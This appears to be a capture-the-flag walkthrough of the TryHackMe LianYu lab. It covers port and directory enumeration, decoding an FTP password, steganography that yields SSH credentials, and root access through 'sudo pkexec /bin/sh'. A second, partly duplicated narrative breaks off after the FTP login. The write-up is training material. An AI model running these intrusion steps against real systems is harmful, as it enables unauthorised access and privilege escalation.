# W6-TryHackMe-LianYu-Walkthrough
## **Summary**

| Phase                     | Action                                  | Outcome                                      |
|--------------------------|-----------------------------------------|----------------------------------------------|
| Reconnaissance           | `Nmap` scan                             | Identified open ports (FTP, SSH, HTTP)       |
| Scanning & Enumeration   | `Gobuster`, source code review          | Found `/island` and `/2100`                  |
| Scanning & Enumeration   | Gobuster with `.ticket` extension       | Discovered `/green_arrow.ticket`             |
| Gaining Access           | Base58 decoding                         | Retrieved FTP credentials                    |
| Exploitation             | FTP login + file extraction             | Discovered hidden files & images             |
| Post-Exploitation        | File analysis + steganography           | Extracted SSH credentials                    |
| Privilege Escalation     | `pkexec` via GTFOBins                   | Root access obtained                         |

---

## **1. Reconnaissance (Information Gathering)**

**Objective:** Identify target surface and exposed services.

Always start with an Nmap scan to discover open ports and services.

```bash
nmap -sC -sV -Pn -T4 10.48.140.128
<img src="ADD_NMAP_SCREENSHOT" />
Findings:
Service	Port	What can be done (commands / next step)	Findings
FTP	21	ftp 10.48.140.128	Requires credentials
SSH	22	ssh user@10.48.140.128	Possible remote login
HTTP	80	Open in browser	Main entry point
RPC	111	Enumeration possible	Low priority
Explanation:

The scan shows multiple services, but HTTP (port 80) is the best starting point because web applications often expose hidden directories or sensitive data.

2. Scanning & Enumeration

Objective: Extract deeper information from identified services.

Web Enumeration
gobuster dir -u http://10.48.140.128 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<img src="ADD_GOBUSTER_SCREENSHOT" />
Discovered:
/island
/island
http://10.48.140.128/island
<img src="ADD_ISLAND_SCREENSHOT" />
Finding:

Hidden text (highlighted):

vigilante
Explanation:

This keyword is likely used later as a username or credential.

Further Enumeration
gobuster dir -u http://10.48.140.128/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<img src="ADD_2100_GOBUSTER_SCREENSHOT" />
Discovered:
/2100
/island/2100
http://10.48.140.128/island/2100
<img src="ADD_2100_PAGE_SCREENSHOT" />

Check source code:

<!-- you can avail your ticket here but how? -->
Explanation:

This hint suggests a hidden file, likely with a specific extension.

Search for .ticket files
gobuster dir -u http://10.48.140.128/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket
<img src="ADD_TICKET_SCREENSHOT" />
Discovered:
/green_arrow.ticket
3. Gaining Access (Exploitation)

Objective: Decode hidden credentials.

Ticket Content:
RTy8yhBQdscX
Explanation:

The string is encoded. After testing different formats, it is identified as Base58 encoding.

Decoded result:

!#th3h00d

➡️ This is the FTP password

FTP Login
ftp 10.48.140.128

Credentials:

Username: vigilante
Password: !#th3h00d
<img src="ADD_FTP_SCREENSHOT" />
4. Maintaining Access (Post-Exploitation)

Objective: Extract and analyze files from FTP.

Download Files
mget *
ls -la
<img src="ADD_FTP_FILES_SCREENSHOT" />
Files Found:
Leave_me_alone.png
Queen's_Gambit.png
aa.jpg
.other_user
Hidden File Analysis
cat .other_user
<img src="ADD_OTHER_USER_SCREENSHOT" />
Finding:
Slade Wilson
Explanation:

This is likely the SSH username.

5. Exploitation (File Analysis & Steganography)
Step 1: Fix Corrupted PNG
exiftool Leave_me_alone.png

Error:

File format error
Explanation:

The PNG file has an incorrect file signature, causing it to fail.

Fix using Hexeditor
hexeditor Leave_me_alone.png

Correct header:

89 50 4E 47 0D 0A 1A 0A
<img src="ADD_HEXEDITOR_SCREENSHOT" />
Result
<img src="ADD_FIXED_IMAGE_SCREENSHOT" />
Finding:
password
Step 2: Extract Hidden Data
steghide extract -sf aa.jpg

Password:

password
<img src="ADD_STEGHIDE_SCREENSHOT" />
Output:
ss.zip
unzip ss.zip
<img src="ADD_UNZIP_SCREENSHOT" />
Extracted Files:
passwd.txt
shado
Inspect Credentials
cat shado
<img src="ADD_SHADO_SCREENSHOT" />
Result:
M3tahuman

➡️ SSH Password

6. Gaining Shell Access
ssh slade@10.48.140.128

Credentials:

Username: slade
Password: M3tahuman
<img src="ADD_SSH_SCREENSHOT" />
User Flag
cat user.txt
<img src="ADD_USER_FLAG_SCREENSHOT" />
7. Privilege Escalation & Lateral Movement
Check sudo permissions
sudo -l
<img src="ADD_SUDO_SCREENSHOT" />
Finding:
(root) /usr/bin/pkexec
Exploit using GTFOBins
sudo pkexec /bin/sh
<img src="ADD_ROOT_SCREENSHOT" />
Verify Root
whoami
root
Root Flag
cat root.txt
<img src="ADD_ROOT_FLAG_SCREENSHOT" />

After that, I navigated to:

```bash
http://<TARGET_IP>/island

<img width="940" height="273" alt="image" src="https://github.com/user-attachments/assets/61f7adde-1d81-4937-abee-11abe662ea37" />
<img width="940" height="440" alt="image" src="https://github.com/user-attachments/assets/03953d43-8ab5-4752-93b7-4e7b1ef8b0de" />


While inspecting the page by highlighting the text and viewing the page source, I discovered a hidden keyword:

```bash
vigilante

This keyword is likely to be used as a username for further access.
Then, I continued enumeration by running Gobuster again on the /island directory:
```bash
gobuster dir -u http://<TARGET_IP>/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

<img width="940" height="299" alt="image" src="https://github.com/user-attachments/assets/17b44b74-b444-4190-90c3-59956e05e603" />

From this scan, I found another directory:

```bash
/2100

Next, I accessed:

```bash
http://<TARGET_IP>/island/2100

<img width="940" height="683" alt="image" src="https://github.com/user-attachments/assets/f5d6c670-3eab-45b6-8620-31f7324ec0c4" />
<img width="840" height="344" alt="image" src="https://github.com/user-attachments/assets/49f7bfbb-8620-4c65-b2b2-15d28b478532" />

After viewing the page source, I noticed a hint mentioning a file with a .ticket extension.
To locate the file, I performed another Gobuster scan with file extension filtering:

```bash
gobuster dir -u http://<TARGET_IP>/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket

<img width="940" height="319" alt="image" src="https://github.com/user-attachments/assets/c0021380-c32d-440c-ab8a-062180451e6b" />

From the result, I found:

```bash
green_arrow.ticket

After that, I opened the file in the browser:

```bash
http://<TARGET_IP>/island/2100/green_arrow.ticket

<img width="940" height="183" alt="image" src="https://github.com/user-attachments/assets/93388904-6641-42f0-a269-11198cb4daa4" />

Inside the file, I found an encoded string:

```bash
RTy8yhBQdscX

Next, I used CyberChef to decode the string. By testing different decoding methods, I found that it uses Base58 encoding

<img width="898" height="510" alt="image" src="https://github.com/user-attachments/assets/132d85a0-9f76-4158-84f9-856ebc018302" />

The decoded result is:

```bash
!#th3h00d

This value is identified as the FTP password.

---

## **3. Gaining Access (FTP Login)**

**Objective:** Use discovered credentials to gain initial access.

Using the username and password obtained earlier:

Username: vigilante
Password: !#th3h00d

I logged into the FTP service:

```bash
ftp <TARGET_IP>

After successfully logging in, I listed the files using:

```bash
ls

<img width="866" height="365" alt="image" src="https://github.com/user-attachments/assets/589a5c25-0f24-4205-83fd-2e4a34378433" />





